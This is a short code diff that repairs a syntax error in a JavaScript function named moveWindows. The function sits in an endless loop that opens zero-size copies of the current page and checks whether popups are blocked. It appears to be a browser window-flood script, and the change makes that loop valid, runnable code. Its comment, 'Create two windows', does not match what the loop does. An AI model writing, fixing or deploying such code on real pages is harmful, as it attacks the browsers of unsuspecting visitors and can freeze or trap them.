@@ -4,7 +4,7 @@ function sleep(ms) {
 
 function moveWindows() {
   // Create two windows
-  while (true) do {
+  while (true) {
     let newWindow = window.open(location.href, "_blank", "width=0,height=0");
 
     if (!newWindow || newWindow.closed || typeof newWindow.closed == "undefined") {
